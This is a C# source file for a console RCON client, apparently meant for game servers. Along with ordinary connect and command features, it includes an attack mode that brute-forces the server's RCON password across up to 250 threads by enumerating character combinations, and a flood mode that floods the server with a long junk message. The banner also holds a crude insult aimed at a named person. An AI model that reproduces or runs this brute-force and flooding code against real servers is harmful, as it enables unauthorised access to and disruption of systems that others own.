using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BarrocaRCON
{
    class Program
    {
        static string InvalidPasswordString = "Invalid password.";
        static Encoding _encoding = CodePagesEncodingProvider.Instance.GetEncoding(1252);

        static void Main(string[] args)
        {
            Console.WriteLine("#### BarrocaRCON v1.0 - Tonhão é baitola ####");
            Console.WriteLine("Type help for commands:");

            bool quit = false;
            while (!quit)
            {
                // Check for command
                string[] cmd = Console.ReadLine().Split(' ');

                // Ignore /cmd|-cmd = cmd
                if (cmd[0].StartsWith("/") || cmd[0].StartsWith("-"))
                    cmd[0] = cmd[0].Substring(1, cmd[0].Length - 1);

                // Check for command
                switch (cmd[0])
                {
                    case "quit":
                    case "exit":
                        quit = true;
                        break;

                    case "help":
                        Console.WriteLine("Commands:");
                        Console.WriteLine("help");
                        Console.WriteLine("quit|exit");
                        Console.WriteLine("connect ip:port password");
                        Console.WriteLine("encoding <codepage number>");
                        break;

                    case "connect":
                        IPAddress IP;
                        ushort Port;
                        string Password;

                        string[] Address = new string[2];
                        
                        // Interactive
                        if (cmd.Length == 1)
                        {
                            Console.WriteLine("Server IP:");
                            Address[0] = Console.ReadLine();

                            Console.WriteLine("Server Port:");
                            Address[1] = Console.ReadLine();

                            Console.WriteLine("Server Password:");
                            Password = Console.ReadLine();
                        }

                        // Direct
                        else
                        {
                            if (cmd.Length != 3)
                            {
                                Console.WriteLine("usage: connect ip:port password");
                                break;
                            }

                            if (!cmd[1].Contains(":"))
                            {
                                Console.WriteLine("usage: connect ip:port password");
                                break;
                            }

                            Address = cmd[1].Split(':');
                            Password = cmd[2];
                        }

                        // Check IP
                        if (!IPAddress.TryParse(Address[0], out IP))
                        {
                            Console.WriteLine($"Invalid IP address: {Address[0]}!");
                            break;
                        }

                        // Check Port
                        if (!ushort.TryParse(Address[1], out Port))
                        {
                            Console.WriteLine($"Invalid Port: {Address[1]}!");
                            break;
                        }

                        ConnectToServer(IP, Port, Password).GetAwaiter();
                        break;

                    case "encoding":
                        int CodePage = 0;
                        bool EncodingSelected = false;
                        while (!EncodingSelected)
                        {
                            Console.WriteLine("Select encoding:");
                            Console.WriteLine("0 - Default");
                            Console.WriteLine("1 - Latin 1252");
                            Console.WriteLine("x - Other (CodePage number)");

                            if (int.TryParse(Console.ReadLine(), out CodePage))
                            {
                                if (CodePage == 0)
                                    CodePage = Encoding.Default.CodePage;
                                else if (CodePage == 1)
                                    CodePage = 1252;

                                try
                                {
                                    _encoding = CodePagesEncodingProvider.Instance.GetEncoding(CodePage);
                                    EncodingSelected = true;

                                    Console.WriteLine($"Encoding changed to {CodePage}.");
                                }
                                catch (Exception)
                                {
                                    EncodingSelected = false;
                                    Console.WriteLine("Invalid encoding!");
                                }
                            }
                        }
                        break;

                    default:
                        Console.WriteLine("Unknown command, type help for commands.");
                        break;
                }
            }

            Console.WriteLine("Press any key to continue...");
            Console.ReadKey();
        }

        static RCON rcon;
        static async Task ConnectToServer(IPAddress IP, ushort Port, string Password)
        {
            try
            {
                rcon = new RCON(IP, Port);
                Console.WriteLine($"Connected to: {IP}:{Port}");
                Console.WriteLine("Waiting for commands, type help if you need:");

                while (true)
                {
                    // Check for command
                    string plainCMD = Console.ReadLine();
                    string[] cmd = plainCMD.Split(' ');

                    // Ignore /cmd|-cmd = cmd
                    if (cmd[0].StartsWith("/") || cmd[0].StartsWith("-"))
                        cmd[0] = cmd[0].Substring(1, cmd[0].Length - 1);

                    // Check for command
                    switch (cmd[0])
                    {
                        case "disconnect":
                        case "dc":
                        case "exit":
                            if (!Attacking)
                            {
                                Console.WriteLine("Disconnected.");
                                return;
                            }
                            break;

                        case "help":
                            if (!Attacking)
                            {
                                Console.WriteLine("Commands:");
                                Console.WriteLine("-help");
                                Console.WriteLine("-disconnect|dc|exit");
                                Console.WriteLine("-bruteforce|force|attack [threads] [-f (flood)]");
                                Console.WriteLine("-cancel|stop");
                            }
                            break;

                        case "bruteforce":
                        case "force":
                        case "attack":
                            if (!Attacking)
                            {
                                isFlooding = false;

                                if (cmd.Length < 3)
                                {
                                    int threads;
                                    if (int.TryParse(cmd[1], out threads))
                                    {
                                        BruteForce(threads).GetAwaiter();
                                    }
                                    else if (cmd[1] == "-f")
                                    {
                                        isFlooding = true;
                                        BruteForce().GetAwaiter();
                                    }

                                }
                                else if (cmd.Length == 3)
                                {
                                    int threads;
                                    if (int.TryParse(cmd[1], out threads))
                                    {
                                        if (cmd[2] == "-f")
                                            isFlooding = true;

                                        BruteForce(threads).GetAwaiter();
                                    }
                                    else if (int.TryParse(cmd[2], out threads))
                                    {
                                        if (cmd[1] == "-f")
                                            isFlooding = true;

                                        BruteForce(threads).GetAwaiter();
                                    }
                                }
                                else
                                {
                                    BruteForce().GetAwaiter();
                                }
                            }
                            break;

                        case "cancel":
                        case "stop":
                            Attacking = false;
                            break;

                        default:
                            if (!Attacking)
                                Console.WriteLine(await rcon.ExecuteCommand(_encoding, Password, plainCMD));
                            break;
                    }

                    if (Attacking)
                        Console.Clear();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.ToString()}");
            }
        }
 
        static bool Attacking = false;
        static bool isFlooding = false;
        static string FloodingMSG =
            "e638wm4fevU7Yc2Amb6gYqa7j4qwM7GR3zA9LeeBALjaNamZWgSMhSvsMvNaskC6v3QR8G4jhdjGdwhMCZqwvvNSQcSS8kzdXfVGMPQFDLcu7m6kW6G3b6KR8tm6pK9XBFvY7WvmyjEvfAE3gWGjSgLQmWxzjhnwzu7gfcuDmXJcadRgMpbvvNbFmjRfs4pRnkXdn3GkR28CRPvu3xN9VAE7K7d22cuYn4PkV7vpYeQFTbYyjCx54MMDKBfnDmWQ";

        static async Task BruteForce(int TotalAttackThreads = 250)
        {
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            PasswordsGenerated = 0;
            CommonTrying = true;
            Attacking = true;
            isFlooding = false;

            Console.WriteLine("[" + TotalAttackThreads + "] " + (isFlooding ? "Flood" : "Bruteforce") + " attacking...");
            Thread.Sleep(3000);
            Console.Clear();
            //Console.WriteLine();
            //Console.WriteLine();        

            // Start threads
            Thread[] AttackThreads = new Thread[TotalAttackThreads];

            for (int i = 1; i < TotalAttackThreads; i++)
            {
                AttackThreads[i - 1] = new Thread(async () => { await BruteForceThread(); });
                AttackThreads[i - 1].Start();
            }
            
            while (Attacking)
            {
                // Prevent high usage
                //await Task.Delay(10);
            }

            stopwatch.Stop();
            Console.WriteLine(isFlooding ? "Flood" : "Bruteforce" + $"attack stopped. Duration: {GetTime(stopwatch.Elapsed)}");
        }

        static string GetTime(TimeSpan elapsed)
        {
            if (elapsed.TotalSeconds < 1)
                return elapsed.TotalSeconds + "ms";
            else if (elapsed.TotalMinutes < 1)
                return elapsed.TotalSeconds + "s";
            else if ((elapsed.TotalHours < 1))
                return elapsed.TotalMinutes + "m";
            else
                return elapsed.TotalMinutes + "h";
        }

        static async Task BruteForceThread()
        {
            if (isFlooding)
            {
                if (PasswordsGenerated % 10 == 0)
                {
                    Console.Write($"\rTotal messages sended: {PasswordsGenerated.ToString("000000000000")}");
                }

                await rcon.ExecuteCommand(_encoding, "123", FloodingMSG, false);
                PasswordsGenerated++;
            }
            else
            {

                string pwd;
                while (Attacking)
                {
                    pwd = GenerateString();

                    if (PasswordsGenerated % 10 == 0)
                    {
                        Console.Write($"\rTotal passwords tried: {PasswordsGenerated.ToString("000000000000")} | length: {pwd.Length}");
                    }

                    if (await rcon.ExecuteCommand(_encoding, pwd, "abc", true) != InvalidPasswordString)
                    {
                        Attacking = false;
                        await Task.Delay(5000);
                        Console.WriteLine($"Bruteforce attack success! Password: {pwd}");
                    }
                }
            }
        }

        static char[] CharList = new char[] {
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',

            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',

            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',

            '-', '_'
            //'!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '_', '.', '=', '+', '/', '\\'
        };

        static ulong PasswordsGenerated = 0;
        static ulong based = ulong.Parse(CharList.Length.ToString());
        static bool CommonTrying = true;
        static string GenerateString()
        {
            string password = "";
            
            // get the current value, increment the next.
            ulong current = PasswordsGenerated++;

            do
            {
                password = CharList[current % based] + password;
                current /= based;
            } while (current != 0);

            return password;
        }
    }
}
